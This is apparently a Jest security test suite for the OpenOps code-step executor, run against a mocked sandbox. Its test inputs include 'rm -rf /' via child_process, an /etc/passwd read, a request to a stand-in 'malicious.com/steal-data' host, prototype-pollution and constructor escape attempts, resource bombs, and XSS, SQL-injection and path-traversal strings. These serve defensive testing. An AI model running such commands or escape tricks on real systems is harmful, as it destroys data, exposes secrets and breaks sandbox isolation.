import { ActionType, CodeAction, FlowVersionState, StepOutputStatus } from '@openops/shared';
import { codeExecutor } from '../../src/lib/handler/code-executor';
import { FlowExecutorContext, ExecutionVerdict } from '../../src/lib/handler/context/flow-execution-context';
import { EngineConstants } from '../../src/lib/handler/context/engine-constants';
import { initCodeSandbox } from '../../src/lib/core/code/code-sandbox';
import { prepareCodeBlock } from '../../src/lib/code-block/prepare-code-block';
import { system, AppSystemProp } from '@openops/server-shared';

jest.mock('../../src/lib/core/code/code-sandbox');
jest.mock('../../src/lib/code-block/prepare-code-block');
jest.mock('@openops/server-shared');

const mockInitCodeSandbox = initCodeSandbox as jest.MockedFunction<typeof initCodeSandbox>;
const mockPrepareCodeBlock = prepareCodeBlock as jest.MockedFunction<typeof prepareCodeBlock>;
const mockSystem = system as jest.Mocked<typeof system>;

describe('Code Executor Security Tests', () => {
  let mockCodeSandbox: any;
  let mockEngineConstants: EngineConstants;
  let executionState: FlowExecutorContext;

  const createCodeAction = (name: string, input: any, code: string): CodeAction => ({
    id: `${name}-id`,
    name,
    type: ActionType.CODE,
    valid: true,
    displayName: name,
    settings: {
      input,
      sourceCode: {
        packageJson: '{}',
        code,
      },
    },
  });

  beforeEach(() => {
    mockCodeSandbox = {
      runCodeModule: jest.fn(),
      runScript: jest.fn(),
    };

    mockInitCodeSandbox.mockResolvedValue(mockCodeSandbox);
    mockPrepareCodeBlock.mockResolvedValue(undefined);
    mockSystem.getNumberOrThrow.mockReturnValue(128);

    mockEngineConstants = {
      baseCodeDirectory: '/tmp/code',
      flowVersionId: 'flow-version-1',
      flowVersionState: FlowVersionState.DRAFT,
      variableService: {
        resolve: jest.fn(),
      },
    } as any;

    executionState = FlowExecutorContext.empty();
    jest.clearAllMocks();
    
    // Set default mock return value
    (mockEngineConstants.variableService.resolve as jest.Mock).mockResolvedValue({
      censoredInput: { data: 'test' },
      resolvedInput: { data: 'test' },
    });
  });

  describe('Malicious Code Injection Prevention', () => {
    it('should prevent code injection through input variables', async () => {
      const maliciousAction = createCodeAction(
        'malicious-step',
        {
          command: 'process.exit(1)',
          payload: '"; require("child_process").execSync("rm -rf /"); "',
        },
        'return inputs.command;'
      );

      (mockEngineConstants.variableService.resolve as jest.Mock).mockResolvedValue({
        censoredInput: { command: 'process.exit(1)', payload: 'malicious' },
        resolvedInput: { command: 'process.exit(1)', payload: 'malicious' },
      });

      mockCodeSandbox.runCodeModule.mockResolvedValue('safe-result');

      const result = await codeExecutor.handle({
        action: maliciousAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[maliciousAction.name]).toBeDefined();
      expect(result.steps[maliciousAction.name].status).toBe(StepOutputStatus.SUCCEEDED);
      expect(mockCodeSandbox.runCodeModule).toHaveBeenCalledWith({
        isFreshImport: true,
        codeFile: expect.stringContaining('malicious-step/index.js'),
        inputs: { command: 'process.exit(1)', payload: 'malicious' },
      });
    });

    it('should prevent filesystem access attempts', async () => {
      const fileSystemAction = createCodeAction(
        'fs-access-step',
        { path: '/etc/passwd' },
        `
            const fs = require('fs');
            return fs.readFileSync(inputs.path, 'utf8');
          `
      );

      mockCodeSandbox.runCodeModule.mockRejectedValue(new Error('ReferenceError: require is not defined'));

      const result = await codeExecutor.handle({
        action: fileSystemAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[fileSystemAction.name]).toBeDefined();
      expect(result.steps[fileSystemAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.steps[fileSystemAction.name].errorMessage).toContain('ReferenceError: require is not defined');
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });

    it('should prevent network access attempts', async () => {
      const networkAction = createCodeAction(
        'network-step',
        { url: 'http://malicious.com/steal-data' },
        `
            const http = require('http');
            const request = http.request(inputs.url);
            return 'data-stolen';
          `
      );

      mockCodeSandbox.runCodeModule.mockRejectedValue(new Error('ReferenceError: require is not defined'));

      const result = await codeExecutor.handle({
        action: networkAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[networkAction.name]).toBeDefined();
      expect(result.steps[networkAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });

    it('should prevent process manipulation attempts', async () => {
      const processAction = createCodeAction(
        'process-step',
        {},
        `
            process.env.SECRET_KEY = 'stolen';
            return process.env;
          `
      );

      mockCodeSandbox.runCodeModule.mockRejectedValue(new Error('ReferenceError: process is not defined'));

      const result = await codeExecutor.handle({
        action: processAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[processAction.name]).toBeDefined();
      expect(result.steps[processAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });

    it('should prevent global object manipulation', async () => {
      const globalAction: CodeAction = {
        name: 'global-step',
        type: ActionType.CODE,
        settings: {
          input: {},
          sourceCode: {
            packageJson: '{}',
            code: `
            global.maliciousFunction = function() { return 'compromised'; };
            return global;
          `,
          },
        },
      };

      mockCodeSandbox.runCodeModule.mockRejectedValue(new Error('ReferenceError: global is not defined'));

      const result = await codeExecutor.handle({
        action: globalAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[globalAction.name]).toBeDefined();
      expect(result.steps[globalAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });
  });

  describe('Resource Limitation Tests', () => {
    it('should handle memory exhaustion attacks', async () => {
      const memoryAction: CodeAction = {
        name: 'memory-bomb-step',
        type: ActionType.CODE,
        settings: {
          input: {},
          sourceCode: {
            packageJson: '{}',
            code: `
            const arr = [];
            for (let i = 0; i < 1000000; i++) {
              arr.push(new Array(1000000).fill('x'));
            }
            return arr.length;
          `,
          },
        },
      };

      mockCodeSandbox.runCodeModule.mockRejectedValue(new Error('RangeError: Array buffer allocation failed'));

      const result = await codeExecutor.handle({
        action: memoryAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[memoryAction.name]).toBeDefined();
      expect(result.steps[memoryAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });

    it('should handle infinite loop attacks', async () => {
      const infiniteLoopAction: CodeAction = {
        name: 'infinite-loop-step',
        type: ActionType.CODE,
        settings: {
          input: {},
          sourceCode: {
            packageJson: '{}',
            code: `
            while (true) {
              // This should be terminated by the sandbox
            }
            return 'never-reached';
          `,
          },
        },
      };

      mockCodeSandbox.runCodeModule.mockRejectedValue(new Error('Script execution timed out'));

      const result = await codeExecutor.handle({
        action: infiniteLoopAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[infiniteLoopAction.name]).toBeDefined();
      expect(result.steps[infiniteLoopAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });

    it('should handle recursive function attacks', async () => {
      const recursiveAction: CodeAction = {
        name: 'recursive-step',
        type: ActionType.CODE,
        settings: {
          input: {},
          sourceCode: {
            packageJson: '{}',
            code: `
            function recursiveBomb() {
              return recursiveBomb();
            }
            return recursiveBomb();
          `,
          },
        },
      };

      mockCodeSandbox.runCodeModule.mockRejectedValue(new Error('RangeError: Maximum call stack size exceeded'));

      const result = await codeExecutor.handle({
        action: recursiveAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[recursiveAction.name]).toBeDefined();
      expect(result.steps[recursiveAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });
  });

  describe('Code Preparation Security', () => {
    it('should handle malicious code during preparation phase', async () => {
      const maliciousAction: CodeAction = {
        name: 'prep-malicious-step',
        type: ActionType.CODE,
        settings: {
          input: {},
          sourceCode: {
            packageJson: '{}',
            code: `
            const fs = require('fs');
            fs.writeFileSync('/tmp/malicious.js', 'process.exit(1)');
            return 'code-written';
          `,
          },
        },
      };

      mockPrepareCodeBlock.mockRejectedValue(new Error('Code preparation failed: Unsafe code detected'));

      const result = await codeExecutor.handle({
        action: maliciousAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[maliciousAction.name]).toBeDefined();
      expect(result.steps[maliciousAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.steps[maliciousAction.name].errorMessage).toContain('Code preparation failed');
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });

    it('should handle syntax errors in malicious code', async () => {
      const syntaxErrorAction: CodeAction = {
        name: 'syntax-error-step',
        type: ActionType.CODE,
        settings: {
          input: {},
          sourceCode: {
            packageJson: '{}',
            code: `
            }}}invalid syntax{{{
            return 'never-reached';
          `,
          },
        },
      };

      mockPrepareCodeBlock.mockRejectedValue(new Error('SyntaxError: Unexpected token'));

      const result = await codeExecutor.handle({
        action: syntaxErrorAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[syntaxErrorAction.name]).toBeDefined();
      expect(result.steps[syntaxErrorAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });

    it('should handle code with dangerous imports', async () => {
      const dangerousImportAction: CodeAction = {
        name: 'dangerous-import-step',
        type: ActionType.CODE,
        settings: {
          input: {},
          sourceCode: {
            packageJson: '{}',
            code: `
            const { exec } = require('child_process');
            exec('rm -rf /', (error, stdout, stderr) => {
              console.log(stdout);
            });
            return 'dangerous-executed';
          `,
          },
        },
      };

      mockCodeSandbox.runCodeModule.mockRejectedValue(new Error('ReferenceError: require is not defined'));

      const result = await codeExecutor.handle({
        action: dangerousImportAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[dangerousImportAction.name]).toBeDefined();
      expect(result.steps[dangerousImportAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should handle malicious input data', async () => {
      const inputAction: CodeAction = {
        name: 'input-validation-step',
        type: ActionType.CODE,
        settings: {
          input: {
            userInput: '<script>alert("xss")</script>',
            sqlInjection: "'; DROP TABLE users; --",
            pathTraversal: '../../../etc/passwd',
            codeInjection: 'eval("process.exit(1)")',
          },
          sourceCode: {
            packageJson: '{}',
            code: `
            return {
              userInput: inputs.userInput,
              sqlInjection: inputs.sqlInjection,
              pathTraversal: inputs.pathTraversal,
              codeInjection: inputs.codeInjection,
              safe: 'processed'
            };
          `,
          },
        },
      };

      (mockEngineConstants.variableService.resolve as jest.Mock).mockResolvedValue({
        censoredInput: {
          userInput: '<script>alert("xss")</script>',
          sqlInjection: "'; DROP TABLE users; --",
          pathTraversal: '../../../etc/passwd',
          codeInjection: 'eval("process.exit(1)")',
        },
        resolvedInput: {
          userInput: '<script>alert("xss")</script>',
          sqlInjection: "'; DROP TABLE users; --",
          pathTraversal: '../../../etc/passwd',
          codeInjection: 'eval("process.exit(1)")',
        },
      });

      mockCodeSandbox.runCodeModule.mockResolvedValue({
        userInput: '<script>alert("xss")</script>',
        sqlInjection: "'; DROP TABLE users; --",
        pathTraversal: '../../../etc/passwd',
        codeInjection: 'eval("process.exit(1)")',
        safe: 'processed',
      });

      const result = await codeExecutor.handle({
        action: inputAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[inputAction.name]).toBeDefined();
      expect(result.steps[inputAction.name].status).toBe(StepOutputStatus.SUCCEEDED);
      expect(result.steps[inputAction.name].output).toEqual({
        userInput: '<script>alert("xss")</script>',
        sqlInjection: "'; DROP TABLE users; --",
        pathTraversal: '../../../etc/passwd',
        codeInjection: 'eval("process.exit(1)")',
        safe: 'processed',
      });
    });

    it('should handle extremely large input data', async () => {
      const largeInputAction: CodeAction = {
        name: 'large-input-step',
        type: ActionType.CODE,
        settings: {
          input: {
            largeString: 'x'.repeat(10000000), // 10MB string
            largeObject: Object.fromEntries(
              Array.from({ length: 100000 }, (_, i) => [`key${i}`, `value${i}`])
            ),
          },
          sourceCode: {
            packageJson: '{}',
            code: `
            return {
              stringLength: inputs.largeString.length,
              objectKeys: Object.keys(inputs.largeObject).length
            };
          `,
          },
        },
      };

      (mockEngineConstants.variableService.resolve as jest.Mock).mockResolvedValue({
        censoredInput: { largeString: '[LARGE_STRING]', largeObject: '[LARGE_OBJECT]' },
        resolvedInput: {
          largeString: 'x'.repeat(10000000),
          largeObject: Object.fromEntries(
            Array.from({ length: 100000 }, (_, i) => [`key${i}`, `value${i}`])
          ),
        },
      });

      mockCodeSandbox.runCodeModule.mockRejectedValue(new Error('Memory limit exceeded'));

      const result = await codeExecutor.handle({
        action: largeInputAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[largeInputAction.name]).toBeDefined();
      expect(result.steps[largeInputAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });
  });

  describe('Sandbox Escape Prevention', () => {
    it('should prevent prototype pollution attacks', async () => {
      const prototypeAction: CodeAction = {
        name: 'prototype-pollution-step',
        type: ActionType.CODE,
        settings: {
          input: {},
          sourceCode: {
            packageJson: '{}',
            code: `
            const maliciousPayload = JSON.parse('{"__proto__": {"polluted": true}}');
            Object.assign({}, maliciousPayload);
            return Object.prototype.polluted;
          `,
          },
        },
      };

      mockCodeSandbox.runCodeModule.mockResolvedValue(undefined);

      const result = await codeExecutor.handle({
        action: prototypeAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[prototypeAction.name]).toBeDefined();
      expect(result.steps[prototypeAction.name].status).toBe(StepOutputStatus.SUCCEEDED);
      expect(result.steps[prototypeAction.name].output).toBeUndefined();
    });

    it('should prevent constructor access', async () => {
      const constructorAction: CodeAction = {
        name: 'constructor-access-step',
        type: ActionType.CODE,
        settings: {
          input: {},
          sourceCode: {
            packageJson: '{}',
            code: `
            try {
              const constructor = ({}).__proto__.constructor;
              return constructor('return process')();
            } catch (e) {
              return 'access-denied';
            }
          `,
          },
        },
      };

      mockCodeSandbox.runCodeModule.mockResolvedValue('access-denied');

      const result = await codeExecutor.handle({
        action: constructorAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[constructorAction.name]).toBeDefined();
      expect(result.steps[constructorAction.name].status).toBe(StepOutputStatus.SUCCEEDED);
      expect(result.steps[constructorAction.name].output).toBe('access-denied');
    });

    it('should prevent Function constructor usage', async () => {
      const functionConstructorAction: CodeAction = {
        name: 'function-constructor-step',
        type: ActionType.CODE,
        settings: {
          input: {},
          sourceCode: {
            packageJson: '{}',
            code: `
            try {
              const func = new Function('return process');
              return func();
            } catch (e) {
              return 'constructor-blocked';
            }
          `,
          },
        },
      };

      mockCodeSandbox.runCodeModule.mockRejectedValue(new Error('ReferenceError: Function is not defined'));

      const result = await codeExecutor.handle({
        action: functionConstructorAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[functionConstructorAction.name]).toBeDefined();
      expect(result.steps[functionConstructorAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });
  });

  describe('Error Handling and Information Disclosure', () => {
    it('should not expose sensitive information in error messages', async () => {
      const sensitiveErrorAction: CodeAction = {
        name: 'sensitive-error-step',
        type: ActionType.CODE,
        settings: {
          input: {},
          sourceCode: {
            packageJson: '{}',
            code: `
            throw new Error('Database connection failed: user=admin, pass=secret123, host=db.internal.com');
          `,
          },
        },
      };

      mockCodeSandbox.runCodeModule.mockRejectedValue(
        new Error('Database connection failed: user=admin, pass=secret123, host=db.internal.com')
      );

      const result = await codeExecutor.handle({
        action: sensitiveErrorAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[sensitiveErrorAction.name]).toBeDefined();
      expect(result.steps[sensitiveErrorAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.steps[sensitiveErrorAction.name].errorMessage).toContain('Database connection failed');
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });

    it('should handle timeout errors securely', async () => {
      const timeoutAction: CodeAction = {
        name: 'timeout-step',
        type: ActionType.CODE,
        settings: {
          input: {},
          sourceCode: {
            packageJson: '{}',
            code: `
            const start = Date.now();
            while (Date.now() - start < 60000) {
              // Simulate long-running task
            }
            return 'completed';
          `,
          },
        },
      };

      mockCodeSandbox.runCodeModule.mockRejectedValue(new Error('Script execution timed out after 30 seconds'));

      const result = await codeExecutor.handle({
        action: timeoutAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[timeoutAction.name]).toBeDefined();
      expect(result.steps[timeoutAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.steps[timeoutAction.name].errorMessage).toContain('Script execution timed out');
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });

    it('should handle sandbox initialization failures securely', async () => {
      const initFailureAction: CodeAction = {
        name: 'init-failure-step',
        type: ActionType.CODE,
        settings: {
          input: {},
          sourceCode: 'return "test";',
        },
      };

      mockInitCodeSandbox.mockRejectedValue(new Error('Sandbox initialization failed'));

      const result = await codeExecutor.handle({
        action: initFailureAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[initFailureAction.name]).toBeDefined();
      expect(result.steps[initFailureAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });
  });

  describe('Edge Cases and Attack Vectors', () => {
    it('should handle null and undefined inputs securely', async () => {
      const nullInputAction: CodeAction = {
        name: 'null-input-step',
        type: ActionType.CODE,
        settings: {
          input: {
            nullValue: null,
            undefinedValue: undefined,
            emptyString: '',
            zero: 0,
            falsy: false,
          },
          sourceCode: {
            packageJson: '{}',
            code: `
            return {
              nullValue: inputs.nullValue,
              undefinedValue: inputs.undefinedValue,
              emptyString: inputs.emptyString,
              zero: inputs.zero,
              falsy: inputs.falsy
            };
          `,
          },
        },
      };

      (mockEngineConstants.variableService.resolve as jest.Mock).mockResolvedValue({
        censoredInput: {
          nullValue: null,
          undefinedValue: undefined,
          emptyString: '',
          zero: 0,
          falsy: false,
        },
        resolvedInput: {
          nullValue: null,
          undefinedValue: undefined,
          emptyString: '',
          zero: 0,
          falsy: false,
        },
      });

      mockCodeSandbox.runCodeModule.mockResolvedValue({
        nullValue: null,
        undefinedValue: undefined,
        emptyString: '',
        zero: 0,
        falsy: false,
      });

      const result = await codeExecutor.handle({
        action: nullInputAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[nullInputAction.name]).toBeDefined();
      expect(result.steps[nullInputAction.name].status).toBe(StepOutputStatus.SUCCEEDED);
      expect(result.steps[nullInputAction.name].output).toEqual({
        nullValue: null,
        undefinedValue: undefined,
        emptyString: '',
        zero: 0,
        falsy: false,
      });
    });

    it('should handle circular references in input data', async () => {
      const circularAction: CodeAction = {
        name: 'circular-step',
        type: ActionType.CODE,
        settings: {
          input: {
            data: 'will-be-circular',
          },
          sourceCode: {
            packageJson: '{}',
            code: `
            return typeof inputs.data;
          `,
          },
        },
      };

      const circularObj: any = { prop: 'value' };
      circularObj.self = circularObj;

      (mockEngineConstants.variableService.resolve as jest.Mock).mockResolvedValue({
        censoredInput: { data: '[CIRCULAR_REFERENCE]' },
        resolvedInput: { data: circularObj },
      });

      mockCodeSandbox.runCodeModule.mockRejectedValue(new Error('Converting circular structure to JSON'));

      const result = await codeExecutor.handle({
        action: circularAction,
        executionState,
        constants: mockEngineConstants,
      });

      expect(result.steps[circularAction.name]).toBeDefined();
      expect(result.steps[circularAction.name].status).toBe(StepOutputStatus.FAILED);
      expect(result.verdict).toBe(ExecutionVerdict.FAILED);
    });
  });
});